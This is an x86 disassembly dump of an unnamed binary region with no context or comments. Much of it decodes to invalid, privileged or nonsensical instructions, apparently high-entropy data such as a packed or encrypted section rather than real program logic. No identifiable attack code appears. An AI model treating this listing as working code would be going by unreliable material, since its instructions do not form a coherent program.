  40eda9:	sbb    DWORD PTR [ebx],0xffffffae
  40edac:	add    dh,BYTE PTR [ebx+edi*1+0x32]
  40edb0:	cmp    al,0x0
  40edb2:	adc    esi,DWORD PTR [ebp-0x151a3fd5]
  40edb8:	les    eax,FWORD PTR [edi]
  40edba:	xor    bh,BYTE PTR ds:[ebx]
  40edbd:	jle    0x40eda9
  40edbf:	mov    eax,ds:0x11e73c83
  40edc4:	inc    ebx
  40edc5:	add    BYTE PTR [esi],bh
  40edc7:	pop    edi
  40edc8:	add    DWORD PTR [ebx],ebp
  40edca:	jle    0x40ee45
  40edcc:	retf   
  40edcd:	rol    DWORD PTR [esi-0x4e],0x82
  40edd1:	aaa    
  40edd2:	enter  0x3a66,0x8b
  40edd6:	jmp    0x40ed7d
  40edd8:	dec    esp
  40edd9:	sbb    DWORD PTR [ecx+esi*4],0xb
  40eddd:	shr    BYTE PTR [ebx+0x3a7c83ac],cl
  40ede3:	mov    bl,0x6d
  40ede5:	add    al,0x55
  40ede7:	bnd jmp 0x40ee0d
  40edea:	sbb    DWORD PTR [edi+0x8],ebp
  40eded:	mov    edi,DWORD PTR [ebx-0x4a]
  40edf0:	std    
  40edf1:	(bad)  
  40edf2:	cmp    eax,0x1ec102b2
  40edf7:	pop    ebx
  40edf8:	jmp    0x40ee4d
  40edfa:	out    0x82,al
  40edfc:	jo     0x40edf6
  40edfe:	lock or ah,BYTE PTR [edx+0x4e]
	...
  40ee2a:	add    BYTE PTR [eax],al
  40ee2c:	sbb    DWORD PTR ss:[ecx-0x64b09508],edi
  40ee33:	jmp    0x40ee04
  40ee35:	(bad)  
  40ee36:	cmp    eax,0x200069f8
  40ee3b:	lds    eax,FWORD PTR [ecx+0x5b]
  40ee3e:	add    bl,ch
  40ee40:	shl    BYTE PTR ds:0x5332f8f5,0x93
  40ee47:	add    esp,DWORD PTR [ebx+ebx*2]
  40ee4a:	push   ss
  40ee4b:	push   cs
  40ee4c:	and    ah,bh
  40ee4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee4f:	add    edi,DWORD PTR [ebp+0x7e0cd896]
  40ee55:	test   BYTE PTR es:[edx+0x7829efa],cl
  40ee5c:	mov    ebx,0x9652f915
  40ee61:	out    0x70,eax
  40ee63:	idiv   DWORD PTR [eax+0x30]
  40ee66:	jmp    0x38ebe8f3
  40ee6b:	div    edx
  40ee6d:	sahf   
  40ee6e:	int    0x11
  40ee70:	call   0xbd451670
  40ee75:	xchg   esi,eax
  40ee76:	in     al,dx
  40ee77:	or     bh,BYTE PTR [esi+0x25]
  40ee7a:	cli    
  40ee7b:	mov    BYTE PTR [edx],al
  40ee7d:	stos   DWORD PTR es:[edi],eax
  40ee7e:	imul   edi,DWORD PTR [edx+edi*1+0x5b],0x1bc51b1d
  40ee86:	icebp  
  40ee87:	inc    ebx
  40ee88:	mov    es,WORD PTR [ebx-0x64d773e7]
  40ee8e:	popa   
  40ee8f:	fadd   QWORD PTR [eax]
	...
  40eeb9:	add    BYTE PTR [edx-0x560886e0],dh
  40eebf:	arpl   WORD PTR [edx],bx
  40eec1:	mul    DWORD PTR [ecx-0x547effa1]
  40eec7:	loop   0x40eec7
  40eec9:	outs   dx,BYTE PTR ds:[esi]
  40eeca:	xchg   esp,eax
  40eecb:	pop    ebx
  40eecc:	lea    ebp,[ebp+ebp*8+0x67f4ff2a]
  40eed3:	cmp    al,BYTE PTR [ecx-0x17]
  40eed6:	mov    esp,0x3ac3079e
  40eedb:	call   0x9e6a:0x6fd14574
  40eee2:	jp     0x40ef3f
  40eee4:	sub    DWORD PTR ds:0x92c2e63a,0xfffffff2
  40eeeb:	pushf  
  40eeec:	pop    es
  40eeed:	jmp    0x1f2cd500
  40eef2:	das    
  40eef3:	call   FWORD PTR [si-0x65cb]
  40eef8:	adc    al,0x98
  40eefa:	sbb    eax,0x7e6a001c
  40eeff:	bound  edx,QWORD PTR [eax-0x2]
  40ef02:	push   cs
  40ef03:	addr16 (bad) 
  40ef05:	jl     0x40ef3c
  40ef07:	call   0x6a00:0x1c1d7c14
  40ef0e:	mov    ecx,0x4a348b62
  40ef13:	in     al,0x1
  40ef15:	xor    DWORD PTR [ebx-0x64],edi
  40ef18:	or     ebp,ecx
  40ef1a:	push   cs
  40ef1b:	out    0xeb,al
  40ef1d:	push   0x0
	...
  40ef47:	add    BYTE PTR [ecx+0x4634fe82],bl
  40ef4d:	or     ecx,0x65
  40ef50:	push   eax
  40ef51:	cdq    
  40ef52:	or     ch,BYTE PTR [ecx-0x5436a132]
  40ef58:	dec    ebp
  40ef59:	pop    ebx
  40ef5a:	call   DWORD PTR [esi+eax*2]
  40ef5d:	cmp    DWORD PTR [edi+eax*2-0x56f566d0],0xffffff91
  40ef65:	pop    edi
  40ef66:	leave  
  40ef67:	add    ch,ah
  40ef69:	ins    DWORD PTR es:[edi],dx
  40ef6a:	add    bh,bh
  40ef6c:	or     ch,BYTE PTR [edx-0x1]
  40ef6f:	jne    0x40ef58
  40ef71:	test   ebx,eax
  40ef73:	std    
  40ef74:	nop
  40ef75:	xchg   ecx,eax
  40ef76:	or     eax,eax
  40ef78:	sbb    bl,BYTE PTR [edx+0x5df7c2c7]
  40ef7e:	push   0x1ef75d
  40ef83:	push   0x413123
  40ef88:	outs   dx,DWORD PTR ds:[esi]
  40ef89:	dec    esi
  40ef8a:	xchg   edx,eax
  40ef8b:	call   DWORD PTR [eax]
  40ef8d:	shl    BYTE PTR gs:[ebp-0x20],0x5
  40ef92:	pop    ebp
  40ef93:	pusha  
  40ef94:	xchg   esi,eax
  40ef95:	pop    ebp
  40ef96:	push   0x1e807e
  40ef9b:	call   0x3edb52
  40efa0:	pushf  
  40efa1:	popf   
  40efa2:	or     eax,0x5f5a84
  40efa7:	add    BYTE PTR [edx],dl
  40efa9:	sbb    edi,esp
  40efab:	push   eax
	...
  40efd4:	add    BYTE PTR [eax],al
  40efd6:	nop
  40efd7:	or     DWORD PTR [edi+edi*8],ecx
  40efda:	push   0x32
  40efdc:	pusha  
  40efdd:	inc    ecx
  40efde:	xchg   edi,eax
  40efdf:	fadd   st(2),st
  40efe1:	or     BYTE PTR [ebp+ebx*4+0xd],ch
  40efe5:	test   edx,eax
  40efe7:	pop    ebp
  40efe8:	add    BYTE PTR [eax],al
  40efea:	std    
  40efeb:	pop    esi
  40efec:	lea    eax,[ebp-0x71]
  40efef:	cs push 0xffffffff
  40eff2:	out    dx,eax
  40eff3:	mov    BYTE PTR [esi+0x41],bl
  40eff6:	mov    ?,WORD PTR [bp+di-0x4]
  40effa:	nop
  40effb:	imul   esp,DWORD PTR [ebp+0x60],0xc4835f16
  40f002:	cmp    esp,DWORD PTR [eax+eax*8+0xf]
  40f006:	call   0xf382:0x3effffdf
  40f00d:	je     0x40f035
  40f00f:	jmp    0x8304:0x439e690e
  40f016:	cli    
  40f017:	jle    0x40f098
  40f019:	mul    DWORD PTR [edx-0x6b17026a]
  40f01f:	add    DWORD PTR [edx],0x0
  40f022:	retf   
  40f023:	(bad)  
  40f024:	out    dx,al
  40f025:	dec    edi
  40f026:	fs xor bl,0x74
  40f02a:	out    0x1a,al
  40f02c:	adc    bh,bh
  40f02e:	loope  0x40f059
  40f030:	or     eax,eax
  40f032:	dec    ecx
  40f033:	push   es
  40f034:	inc    ebp
  40f035:	add    DWORD PTR [esi],edi
  40f037:	cmp    BYTE PTR [edi+0x7c],0x0
	...
  40f063:	add    dl,dl
  40f065:	add    BYTE PTR [ebx],0x84
  40f068:	jnp    0x40efed
  40f06a:	add    al,BYTE PTR [eax]
  40f06c:	mov    esi,0xba0f027a
  40f071:	mov    dh,0x1
  40f073:	add    BYTE PTR [esi],bh
  40f075:	rol    BYTE PTR [edi+0x50c4aa54],cl
  40f07b:	call   0xff35f9ea
  40f080:	hlt    
  40f081:	or     bh,BYTE PTR [edi]
  40f083:	call   0xff300811
  40f088:	or     ebx,DWORD PTR [edx+0x52]
  40f08b:	call   0xff34f99d
  40f090:	jns    0x40f0d1
  40f092:	hlt    
  40f093:	jmp    FWORD PTR [ecx-0x7e]
  40f096:	add    al,bh
  40f098:	sti    
  40f099:	aad    0x2
  40f09b:	add    BYTE PTR [esi],bh
  40f09d:	cmp    BYTE PTR [edi+0x3c],0xcb
  40f0a1:	and    DWORD PTR [ebx+0x0],eax
  40f0a4:	ds push edi
  40f0a6:	push   edx
  40f0a7:	push   0x4322d5
  40f0ac:	es pop ebx
  40f0ae:	arpl   WORD PTR [edx+0x3e],si
  40f0b1:	pop    ebx
  40f0b2:	cmp    DWORD PTR [ebp+edx*4-0x6],ebp
  40f0b6:	daa    
  40f0b7:	add    al,0x21
  40f0b9:	push   cs
  40f0ba:	sub    ebx,0x3e90c9f
  40f0c0:	inc    ebp
  40f0c1:	fwait
  40f0c2:	hlt    
  40f0c3:	sbb    edx,DWORD PTR [esi+0x43080d]
	...
  40f0f1:	add    BYTE PTR [esi],bh
  40f0f3:	or     DWORD PTR [esi+0x72],0x3e
  40f0f7:	pop    ebx
  40f0f8:	mov    ecx,0xa7fa6c6b
  40f0fd:	add    ebp,ecx
  40f0ff:	or     eax,0xc7beb41
  40f104:	jmp    0xbcdc360c
  40f109:	dec    ebx
  40f10a:	adc    ax,0x42c8
  40f10e:	sub    DWORD PTR ds:[edx+0x72],0x3e
  40f113:	pop    ebx
  40f114:	cdq    
  40f115:	imul   esi,DWORD PTR [edx+edi*8],0xffffffa7
  40f119:	add    esi,DWORD PTR [ecx+0x57eb110d]
  40f11f:	or     al,0xe9
  40f121:	add    edx,DWORD PTR [ebp+0x13366a48]
  40f127:	sti    
  40f128:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f129:	add    edi,DWORD PTR [edi]
  40f12b:	push   cs
  40f12c:	jecxz  0x40f199
  40f12e:	mov    ebp,0x9603a7f9
  40f133:	aaa    
  40f134:	js     0x40f139
  40f136:	sub    edx,DWORD PTR ds:[ecx-0x79]
  40f13a:	ficomp WORD PTR [ecx]
  40f13c:	jmp    0xc0c3e433
  40f141:	or     ebp,ebp
  40f143:	pop    edx
  40f144:	jmp    0x41d3627
  40f149:	jns    0x40f129
  40f14b:	sbb    ecx,ebp
  40f14d:	add    eax,0x2005cd3
  40f152:	jp     0x40f1b8
  40f154:	shl    BYTE PTR [eax+eax*1],0x0
	...
  40f180:	pushf  
  40f181:	call   0x1cb8eca
  40f186:	add    DWORD PTR [esi-0x23186c59],ebx
  40f18c:	das    
  40f18d:	xchg   esi,eax
  40f18e:	dec    BYTE PTR [esi-0x6eb07069]
  40f194:	pop    ebp
  40f195:	cwde   
  40f196:	(bad)  
  40f197:	jle    0x40f124
  40f199:	pop    ds
  40f19a:	lock fs ja 0x40f12d
  40f19e:	dec    edi
  40f19f:	add    eax,DWORD PTR [eax-0x6a]
  40f1a2:	je     0x40f205
  40f1a4:	adc    dh,BYTE PTR [edx-0x2]
  40f1a7:	pop    esi
  40f1a8:	in     eax,dx
  40f1a9:	xchg   ebp,eax
  40f1aa:	je     0x40f209
  40f1ac:	mov    al,BYTE PTR [ebx-0x6a32b3ec]
  40f1b2:	mov    BYTE PTR [ecx+esi*8+0x42517cd9],ch
  40f1b9:	sysenter 
  40f1bb:	push   0x4f
  40f1bd:	xchg   edi,edi
  40f1bf:	mov    ah,0x5f
  40f1c1:	add    eax,DWORD PTR [eax]
  40f1c3:	jmp    0x953fca64
  40f1c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f1c9:	jle    0x40f198
  40f1cb:	imul   ebp,DWORD PTR [ebp+0x7594fe95],0xffffff95
  40f1d2:	je     0x40f1c5
  40f1d4:	jne    0x40f215
  40f1d6:	cmp    esi,0xffffff8c
  40f1d9:	xchg   ebp,eax
  40f1da:	je     0x40f1d5
  40f1dc:	mov    WORD PTR [edi],cs
  40f1de:	or     BYTE PTR [ecx],al
  40f1e0:	dec    eax
  40f1e1:	(bad)  
  40f1e3:	out    0x0,al
	...
  40f20d:	add    BYTE PTR [edi+ecx*1-0x14],ch
  40f211:	fsubrp st(6),st
  40f213:	(bad)  
  40f214:	call   0xfed6aaff
  40f219:	into   
  40f21a:	(bad)  
  40f21b:	mov    ah,bh
  40f21d:	add    BYTE PTR [ebx-0x7700021d],dl
  40f223:	adc    ebp,esp
  40f225:	call   0x3ed5a5
  40f22a:	call   0xc429da41
  40f22f:	loop   0x40f22e
  40f231:	dec    esi
  40f233:	frndint 
  40f235:	dec    eax
  40f237:	mov    BYTE PTR [ebx-0x4],dh
  40f23a:	enter  0x6172,0x60
  40f23e:	pop    di
  40f240:	add    esp,0x23
  40f243:	mov    dl,0x7f
  40f245:	cld    
  40f246:	mov    BYTE PTR [ecx+0x5a17c2c7],cl
  40f24c:	push   ebp
  40f24d:	mov    ecx,DWORD PTR [ebx-0x77ff95d3]
  40f253:	adc    ecx,DWORD PTR [eax]
  40f255:	call   0x3f0906
  40f25a:	pop    esp
  40f25b:	mov    ds:0xa4de851,al
  40f260:	add    BYTE PTR [eax],al
  40f262:	int3   
  40f263:	cdq    
  40f264:	jb     0x40f281
  40f266:	aam    0x9c
  40f268:	inc    esi
  40f269:	jmp    0x40f200
  40f26b:	fnstenv [esi]
  40f26d:	or     eax,0x388062d3
	...
  40f29a:	add    BYTE PTR [eax],al
  40f29c:	lods   eax,DWORD PTR ds:[esi]
  40f29d:	adc    al,BYTE PTR ds:0xeb5997c6
  40f2a3:	add    bh,BYTE PTR [ebx+eiz*2]
  40f2a6:	dec    eax
  40f2a7:	cmp    esp,DWORD PTR [ebp+ecx*1-0x16]
  40f2ab:	mov    edx,DWORD PTR [ebp+eiz*1-0x37]
  40f2af:	ret    0x5993
  40f2b2:	push   ebp
  40f2b3:	mov    edi,DWORD PTR [ebx-0x21]
  40f2b6:	ret    0x30b4
  40f2b9:	mov    WORD PTR [ebx+0xc],?
  40f2bc:	(bad)
  40f2c0:	lods   eax,DWORD PTR ds:[esi]
  40f2c2:	cld    
  40f2c3:	mov    edi,0xc94f7ed3
  40f2c8:	jl     0x40f27d
  40f2ca:	add    bh,bh
  40f2cc:	rol    DWORD PTR [edi-0x336db226],cl
  40f2d2:	lock or bh,dh
  40f2d5:	dec    esi
  40f2d6:	pop    es
  40f2d7:	pop    edi
  40f2d8:	pop    es
  40f2d9:	rcl    DWORD PTR [ebx],0x0
  40f2dc:	sub    DWORD PTR [eax+0x18],esi
  40f2df:	jmp    FWORD PTR [ebx+0x1554da92]
  40f2e5:	out    0xf0,al
  40f2e7:	mov    WORD PTR [ebx+0x12],?
  40f2ea:	push   esp
  40f2eb:	call   DWORD PTR [ebx-0x4b0e257a]
  40f2f1:	or     eax,0xb5fe0af1
  40f2f6:	xchg   BYTE PTR [edi],al
  40f2f8:	cmp    eax,0x73ff0282
  40f2fd:	ss icebp 
  40f2ff:	je     0x40f301
	...
  40f329:	add    dh,ah
  40f32b:	sbb    bh,BYTE PTR [ebx-0x2da2671]
  40f331:	mov    edi,0x1e00641
  40f336:	cmp    BYTE PTR ds:[ecx+0x44],0xd2
  40f33b:	stc    
  40f33c:	jmp    0x40f3bd
  40f33e:	jns    0x40f2c2
  40f340:	inc    DWORD PTR [ebx+0x28088]
  40f346:	adc    DWORD PTR [edx+0x57],ebp
  40f349:	jmp    DWORD PTR [ecx+0x6e447b6d]
  40f34f:	gs ja  0x40f322
  40f352:	es push 0x6a3e4164
  40f358:	gs jo  0x40f399
  40f35b:	adc    BYTE PTR [edx-0x1],0xf3
  40f35f:	jno    0x40f3bd
  40f361:	out    dx,al
  40f362:	ficomp WORD PTR [edx+0x28]
  40f365:	add    al,0x56
  40f367:	cs pop ecx
  40f369:	add    al,0x3e
  40f36b:	sub    edx,esi
  40f36d:	jbe    0x40f3dd
  40f36f:	add    ebx,ebx
  40f371:	arpl   di,di
  40f373:	pop    edx
  40f374:	ror    DWORD PTR [eax-0x32],1
  40f377:	pop    edx
  40f378:	jmp    0xa9a0daca
  40f37d:	ja     0x40f3c9
  40f37f:	pusha  
  40f380:	fwait
  40f381:	ja     0x40f3c9
  40f383:	pusha  
  40f384:	mov    al,0x0
  40f386:	ret    
  40f387:	loopne 0x40f373
  40f389:	add    edi,DWORD PTR [esi]
  40f38b:	pusha  
  40f38c:	mov    al,ds:0x76
	...
  40f3b5:	add    BYTE PTR [eax],al
  40f3b7:	add    BYTE PTR [edi-0x64],al
  40f3ba:	and    edi,DWORD PTR [eax+0x3e95b3e]
  40f3c0:	adc    eax,0xca46a65c
  40f3c5:	pop    edx
  40f3c6:	jmp    0xb9d831ce
  40f3cb:	ret    
  40f3cc:	mov    dh,0x93
  40f3ce:	gs lock call 0x396c825d
  40f3d5:	push   cs
  40f3d6:	jmp    0xe8c476a3
  40f3db:	add    edi,DWORD PTR [esi]
  40f3dd:	pop    ebx
  40f3de:	imul   esi,DWORD PTR [eax],0x4b65643e
  40f3e4:	cmp    al,0x5b
  40f3e6:	jmp    0x2ef49a43
  40f3eb:	lock mov al,0xe1
  40f3ee:	stos   DWORD PTR es:[edi],eax
  40f3ef:	mov    edi,0x31115bc
  40f3f4:	sub    edi,DWORD PTR [edx]
  40f3f6:	cmp    DWORD PTR [edx-0xf16e5f8],0xe810a70a
  40f400:	sbb    BYTE PTR [ebx-0x17],bl
  40f403:	cld    
  40f404:	shl    DWORD PTR [ebx+0x0],0x6c
  40f408:	dec    ebx
  40f409:	pop    ecx
  40f40a:	add    cl,ch
  40f40c:	xchg   BYTE PTR [esi],bl
  40f40e:	call   0x9c31fb
  40f413:	shl    BYTE PTR [eax+0x59],1
  40f416:	add    cl,ch
  40f418:	mov    esp,0xe8e816
	...
  40f445:	add    dh,dl
  40f447:	arpl   WORD PTR [ecx+0x449c5644],cx
  40f44d:	sar    DWORD PTR [ebx+ebx*2],1
  40f450:	add    cl,ch
  40f452:	sbb    bl,BYTE PTR [esi-0x21c21700]
  40f458:	jl     0x40f3eb
  40f45a:	cmp    al,0x8
  40f45c:	pshufw mm5,QWORD PTR [edi-0x5d33985],0x5d
  40f464:	add    cl,ch
  40f466:	cmp    eax,0x3de8ad84
  40f46b:	pop    ebx
  40f46c:	cmp    esp,0xffffffe5
  40f46f:	pop    ebp
  40f470:	jne    0x40f458
  40f472:	jp     0x40f483
  40f474:	fsub   QWORD PTR [esi-0x16fc7c79]
  40f47a:	cmp    eax,0x3b80e95b
  40f47f:	pop    ebx
  40f480:	add    BYTE PTR [edx+0x4f],ch
  40f483:	add    DWORD PTR [ebx],0xffffffd4
  40f486:	shl    bl,1
  40f488:	jl     0x40f4ab
  40f48a:	add    DWORD PTR [eax],ebx
  40f48c:	call   0x9c3275
  40f491:	inc    eax
  40f492:	(bad)  
  40f493:	pop    ebx
  40f494:	add    cl,ch
  40f496:	mov    esp,0xa8ece80f
  40f49b:	xlat   BYTE PTR ds:[ebx]
  40f49c:	ins    BYTE PTR es:[edi],dx
  40f49d:	call   0x94ca4fdf
  40f4a2:	jno    0x40f481
  40f4a4:	jl     0x40f4fb
  40f4a6:	cmp    al,BYTE PTR [edi]
  40f4a8:	or     DWORD PTR [eax],eax
	...
  40f4d2:	add    BYTE PTR [eax],al
  40f4d4:	pop    eax
  40f4d5:	and    al,0xe8
  40f4d7:	add    dl,BYTE PTR [edi+0x68eb005e]
  40f4dd:	cdq    
  40f4de:	inc    ebx
  40f4df:	call   0x41533d
  40f4e4:	cwde   
  40f4e5:	and    eax,eax
  40f4e7:	add    BYTE PTR [edi+0x5e],dl
  40f4ea:	add    bh,al
  40f4ec:	sub    cl,bh
  40f4ee:	(bad)  
  40f4ef:	jmp    DWORD PTR [edi+0x5e]
  40f4f2:	mov    DWORD PTR [ebp-0x65],0x5700005e
  40f4f9:	cdq    
  40f4fa:	inc    ebx
  40f4fb:	mov    esp,0x5e27
  40f500:	fsub   DWORD PTR [edx]
  40f502:	mov    eax,0x5e1700
  40f507:	dec    DWORD PTR [edx-0x7d]
  40f50a:	out    0x13,al
  40f50c:	mov    cl,0x80
  40f50e:	std    
  40f50f:	mov    DWORD PTR [edx-0x69],ebx
  40f512:	std    
  40f513:	jne    0x40f4f8
  40f515:	mov    ch,0x6
  40f517:	inc    BYTE PTR [eax-0x60ba787f]
  40f51d:	xor    BYTE PTR [ebx-0x2c],0xbf
  40f521:	mov    bh,bl
  40f523:	jmp    DWORD PTR [eax+0xf]
  40f526:	inc    esp
  40f527:	les    edx,FWORD PTR [ebx+ecx*2+0x75]
  40f52b:	pusha  
  40f52c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f52d:	pop    ebp
  40f52e:	add    BYTE PTR [ebp-0x6b],dh
  40f531:	xor    eax,0x5d96616b
  40f536:	call   0x40f5c2
	...
  40f55f:	add    BYTE PTR [eax],al
  40f561:	add    cl,dh
  40f563:	pop    ebp
  40f564:	add    BYTE PTR [eax+0x7f],dl
  40f567:	xor    al,0x61
  40f569:	inc    ecx
  40f56a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f56b:	xor    BYTE PTR [ebx-0x40],0x4f
  40f56f:	jno    0x40f5e1
  40f571:	add    BYTE PTR [edi+0x3e74be94],dl
  40f577:	mov    WORD PTR [edx+0x72],ds
  40f57a:	pop    ds
  40f57b:	ret    
  40f57c:	add    ch,al
  40f57e:	adc    eax,0xee0002ea
  40f583:	jmp    0x40f5f5
  40f585:	popa   
  40f586:	inc    DWORD PTR [ebx+0x5b7e74ed]
  40f58c:	adc    dh,BYTE PTR [eax+0x3e]
  40f58f:	test   bh,dh
  40f591:	mov    edi,0x7a5c70ea
  40f596:	fild   WORD PTR [edx+0x4]
  40f599:	call   0x45479f
  40f59e:	out    dx,al
  40f59f:	sub    ebp,DWORD PTR [edx+0x61]
  40f5a2:	inc    DWORD PTR [ebx-0x65018b15]
  40f5a8:	hlt    
  40f5a9:	outs   dx,BYTE PTR ds:[esi]
  40f5aa:	ds adc bh,0x24
  40f5ae:	mov    ebp,0x7f607577
  40f5b3:	add    BYTE PTR [ecx],0x75
  40f5b6:	xor    al,0x5a
  40f5b8:	and    DWORD PTR [eax+0x7f],0x982bda82
  40f5bf:	add    BYTE PTR [edx],0x50
  40f5c2:	xchg   esi,eax
  40f5c3:	add    eax,0x4163
	...
  40f5f0:	or     DWORD PTR ds:[edi-0x40],esi
  40f5f4:	out    0xe6,al
  40f5f6:	pop    esp
  40f5f7:	add    BYTE PTR [esi],bh
  40f5f9:	sub    eax,0x8dfe2b02
  40f5fe:	ret    0x5c74
  40f601:	sub    DWORD PTR [edi-0x38],esi
  40f604:	out    0xb0,al
  40f606:	pop    esp
  40f607:	add    BYTE PTR [esi],bh
  40f609:	bnd jmp 0x40f680
  40f60c:	imul   BYTE PTR [edx]
  40f60e:	stc    
  40f60f:	stc    
  40f610:	mov    ecx,0xf2447b49
  40f615:	inc    ecx
  40f616:	ja     0x40f5dc
  40f618:	xchg   esi,eax
  40f619:	pop    ebx
  40f61a:	and    ebx,DWORD PTR [edi+0x3e]
  40f61d:	pop    ebx
  40f61e:	mov    ecx,0x9712ec
  40f623:	cmc    
  40f624:	xchg   esi,eax
  40f625:	nop
  40f626:	or     eax,0x69d3027b
  40f62b:	outs   dx,DWORD PTR ds:[esi]
  40f62c:	jle    0x40f689
  40f62e:	jne    0x40f667
  40f630:	mov    ebp,0xea04310e
  40f635:	inc    eax
  40f636:	add    DWORD PTR [ebx],0xeca6803e
  40f63c:	jmp    0xd58f:0xd8b3d162
  40f643:	in     al,dx
  40f644:	retf   0xcd9a
  40f647:	jbe    0x40f67f
  40f649:	sub    ebp,0xffffff83
  40f64c:	inc    eax
  40f64d:	nop
  40f64e:	mov    ebp,0x3b8ffa76
  40f653:	cld    
	...
  40f67c:	add    BYTE PTR [eax],al
  40f67e:	sbb    DWORD PTR [edi-0x6fd712d3],ecx
  40f684:	sbb    ebp,DWORD PTR [eax+eiz*1+0xedbf106]
  40f68b:	adc    BYTE PTR [esi-0x56f9ef14],dl
  40f691:	fcomi  st,st(3)
  40f693:	fadd   QWORD PTR [ebp-0x4ef9ff14]
  40f699:	fisttp DWORD PTR [ebx]
  40f69b:	fnsave [ebp-0x14]
  40f69e:	lock add eax,0xdd03dba5
  40f6a4:	gs in  al,dx
  40f6a6:	loopne 0x40f6ad
  40f6a8:	popf   
  40f6a9:	fistp  DWORD PTR [ebx-0x2f13aa24]
  40f6af:	add    eax,0xdc93db91
  40f6b4:	inc    ebp
  40f6b5:	in     al,dx
  40f6b6:	aam    0x5d
  40f6b8:	push   0x6e
  40f6ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f6bb:	pop    eax
  40f6bc:	add    BYTE PTR [edx+edi*1+0x3f414498],bh
  40f6c3:	pop    ebx
  40f6c4:	add    cl,ch
  40f6c6:	mov    esi,0x11e9e80e
  40f6cb:	dec    ebx
  40f6cc:	push   0x1a5220
  40f6d1:	push   cs
  40f6d2:	adc    BYTE PTR [edi+0x5ae011e7],bl
  40f6d8:	add    dl,dh
  40f6da:	jge    0x40f6e2
  40f6dc:	pop    es
  40f6dd:	cs clc 
  40f6df:	add    BYTE PTR [eax],0xe9
	...
  40f70a:	add    BYTE PTR [eax],al
  40f70c:	cmp    eax,0xdb4e685b
  40f711:	sbb    DWORD PTR [eax],eax
  40f713:	fmulp  st(7),st
  40f715:	sahf   
  40f716:	out    0xb9,eax
  40f718:	neg    DWORD PTR [edx+0x0]
  40f71b:	loop   0x40f79a
  40f71d:	push   es
  40f71e:	pop    es
  40f71f:	scas   al,BYTE PTR es:[edi]
  40f720:	inc    DWORD PTR [edx+0x5b3de901]
  40f726:	(bad)  
  40f727:	cmp    al,0xf6
  40f729:	jbe    0x40f793
  40f72b:	imul   edx,DWORD PTR ds:0xfddafb8e,0xffffffd3
  40f732:	(bad)  
  40f733:	sahf   
  40f734:	and    eax,0x6247f18e
  40f739:	push   esi
  40f73a:	pcmpgtb mm6,QWORD PTR [ebp+0x1586fe8f]
  40f741:	or     al,dl
  40f743:	xchg   ecx,eax
  40f744:	xor    eax,0xe576fed9
  40f749:	pop    es
  40f74a:	in     al,dx
  40f74b:	cmp    DWORD PTR [ebp-0x27],0x176766fe
  40f752:	lock mov ecx,0x568808f5
  40f758:	in     eax,0x76
  40f75a:	jmp    0x40f7ad
  40f75c:	aad    0x8d
  40f75e:	pop    esi
  40f75f:	add    BYTE PTR [esi],cl
  40f761:	xchg   ebp,eax
  40f762:	push   cs
  40f763:	add    dl,dl
  40f765:	or     eax,0xcb6381eb
  40f76a:	cld    
  40f76b:	call   FWORD PTR [eax-0x66]
  40f76e:	cmp    DWORD PTR [eax+0x0],0x0
	...
  40f799:	add    BYTE PTR [ecx-0x7e],bl
  40f79c:	std    
  40f79d:	add    BYTE PTR [edi-0x1d74ffa6],ah
  40f7a3:	pop    esi
  40f7a4:	or     eax,eax
  40f7a6:	mov    bl,0x5b
  40f7a8:	cmp    BYTE PTR [eax],0x97
  40f7ab:	or     eax,DWORD PTR ds:0x58a3e9
  40f7b1:	add    BYTE PTR [eax+0xb],ch
  40f7b4:	adc    al,0xe8
  40f7b6:	iret   
  40f7b7:	adc    edi,esi
  40f7b9:	jmp    FWORD PTR [edx+ebx*4+0x73]
  40f7bd:	pxor   mm2,mm0
  40f7c0:	dec    ebp
  40f7c1:	inc    ecx
  40f7c2:	xor    DWORD PTR [bp+di+0x14],0xff83ec7f
  40f7ca:	js     0x40f779
  40f7cc:	or     ebp,DWORD PTR [eax-0x2c]
  40f7cf:	push   eax
  40f7d0:	inc    ecx
  40f7d1:	add    al,ch
  40f7d3:	or     dl,BYTE PTR [eax+ebp*8]
  40f7d6:	mov    al,ds:0xaefffddb
  40f7db:	(bad)  [esi+0x6680b8fe]
  40f7e1:	ds es pop edx
  40f7e4:	add    BYTE PTR [ebp-0x3675e],cl
  40f7ea:	mov    eax,0x66ffe829
  40f7ef:	cmp    ebp,0xfc98628d
  40f7f5:	call   FWORD PTR [eax+0x2a]
  40f7f8:	push   DWORD PTR [ebp-0x27c61]
	...
  40f826:	add    BYTE PTR [eax],al
  40f828:	outs   dx,DWORD PTR ds:[esi]
  40f829:	inc    edi
  40f82a:	ins    DWORD PTR es:[edi],dx
  40f82b:	add    BYTE PTR [esi],bh
  40f82d:	test   BYTE PTR [ebx-0x7c],bh
  40f830:	mov    bl,BYTE PTR ds:0x857efeea
  40f836:	jle    0x40f81d
  40f838:	aas    
  40f839:	test   BYTE PTR [edx],al
  40f83b:	(bad)  
  40f83c:	retf   
  40f83d:	inc    ecx
  40f83e:	jmp    0x585a241
  40f843:	adc    BYTE PTR [esi],bh
  40f845:	test   BYTE PTR [edx],al
  40f847:	cmpunordps xmm0,XMMWORD PTR [eax]
  40f84b:	add    BYTE PTR [esi],bh
  40f84d:	test   DWORD PTR [esp+ebp*1-0x12],0xff4ebbdb
  40f855:	sbb    edx,0x9
  40f858:	jmp    0x40f7dd
  40f85a:	add    cl,BYTE PTR [ebx]
  40f85c:	jle    0x40f86c
  40f85e:	add    cl,ch
  40f860:	mov    BYTE PTR [edx+0xeb30002],0xc6
  40f867:	std    
  40f868:	pop    ecx
  40f869:	lods   al,BYTE PTR ds:[esi]
  40f86a:	jbe    0x40f8ad
  40f86c:	and    dl,BYTE PTR [esp+ebx*2-0x35]
  40f870:	stc    
  40f871:	inc    edx
  40f872:	add    al,0xe8
  40f874:	push   ebx
  40f875:	daa    
  40f876:	add    al,0x0
  40f878:	inc    ebp
  40f879:	ret    0x56e
  40f87c:	daa    
  40f87d:	dec    edx
  40f87e:	add    eax,DWORD PTR [eax]
  40f880:	ds mov ebp,0x2f16146e
  40f886:	js     0x40f886
  40f888:	sbb    DWORD PTR [edx+0x74c2],ecx
	...
  40f8b6:	inc    ecx
  40f8b7:	pop    edx
